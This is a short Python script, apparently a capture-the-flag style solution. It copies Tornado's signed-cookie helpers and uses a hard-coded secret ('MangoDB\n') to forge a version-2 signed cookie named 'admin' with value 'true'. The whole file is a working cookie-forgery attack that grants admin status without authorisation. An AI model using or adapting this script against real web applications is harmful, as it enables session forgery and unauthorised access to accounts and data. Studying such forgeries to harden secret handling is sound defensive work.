import hmac
import hashlib
from typing import (
	Dict,
	Any,
	Union,
	Optional,
	Awaitable,
	Tuple,
	List,
	Callable,
	Iterable,
	Generator,
	Type,
	cast,
	overload,
)
_UTF8_TYPES = (bytes, type(None))
unicode_type = str

def utf8(value: Union[None, str, bytes]) -> Optional[bytes]:  # noqa: F811
    """Converts a string argument to a byte string.
    If the argument is already a byte string or None, it is returned unchanged.
    Otherwise it must be a unicode string and is encoded as utf8.
    """
    if isinstance(value, _UTF8_TYPES):
        return value
    if not isinstance(value, unicode_type):
        raise TypeError("Expected bytes, unicode, or None; got %r" % type(value))
    return value.encode("utf-8")

def _create_signature_v2(secret: Union[str, bytes], s: bytes) -> bytes:
	hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)
	hash.update(utf8(s))
	return utf8(hash.hexdigest())

def format_field(s: Union[str, bytes]) -> bytes:
	return utf8("%d:" % len(s)) + utf8(s)

to_sign = b"|".join(
			[
				b"2",
				format_field("0"),
				format_field("1595249713"),
				format_field("admin"),
				format_field("dHJ1ZQ=="),
				b"",
			]
		)


print(to_sign + _create_signature_v2('MangoDB\n',to_sign))